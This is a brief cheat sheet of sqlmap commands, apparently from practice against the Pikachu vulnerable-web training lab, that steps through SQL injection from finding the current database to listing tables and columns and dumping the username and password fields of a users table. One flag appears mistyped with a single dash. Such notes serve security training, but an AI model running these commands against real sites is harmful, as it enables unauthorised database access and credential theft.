sqlmap -u "url" --cookie=""
sqlmap -u "url" -current-db
sqlmap -u "url" -D pikachu --tables
sqlmap -u "url" -D pikachu -T users --columns
sqlmap -u "url" -D pikachu -T users -C username,password --dump

sqlmap -r post.txt